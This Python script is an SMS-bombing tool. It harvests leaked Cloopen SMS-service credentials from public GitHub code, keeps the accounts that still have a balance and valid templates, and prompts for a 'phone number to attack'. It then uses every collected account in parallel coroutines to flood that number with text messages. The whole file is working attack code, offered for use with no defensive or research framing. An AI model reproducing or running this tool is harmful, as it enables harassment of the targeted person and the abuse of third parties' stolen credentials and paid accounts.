from lib.cloopen import Cloopen
from lib.search_github import search_all
from gevent import monkey;

monkey.patch_all()
import gevent
import logging

logging.basicConfig(level=logging.DEBUG)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('github').setLevel(logging.ERROR)

# Macros
MAX_SEND = 30

sent_count = 0


def run(account: Cloopen, recvr):
    from random import choice
    while True:
        resp = account.send_sms(recvr, choice(account.template_ids), '0198', '1230', '1993', '1293')
        if resp['statusCode'] == '000000':
            global sent_count
            sent_count += 1
            # cloopen规定同一个手机号发送间隔为30s
            if sent_count > MAX_SEND:
                break
            gevent.sleep(30)
        else:
            logging.error('协程: [' + hex(id(gevent.getcurrent())) + "]发送消息失败: " + resp['statusMsg'])
            break


def collect_accounts():
    for account in search_all('app.cloopen.com', max_page=6):
        try:
            info = account.query_account_info()
            if info['statusCode'] == '000000':
                balance = float(info['Account']['balance'])
                if balance > 0:
                    account.balance = balance
            if account.load_valid_template_ids():
                yield account
        except KeyboardInterrupt:
            exit(0)
        except:
            pass


if __name__ == '__main__':
    import time

    logging.info('开始搜索账号')
    accounts = list(collect_accounts())
    logging.info('收集到 %d 个账号' % len(accounts))
    target = input('要攻击的手机号: ').strip()
    start = time.time()
    try:
        gevent.joinall([gevent.spawn(run, account, target) for account in accounts])
    except KeyboardInterrupt:
        print('用户退出')
    logging.info('共发送了 %d 条数据, 用时 %.2fs' % (sent_count, time.time() - start))
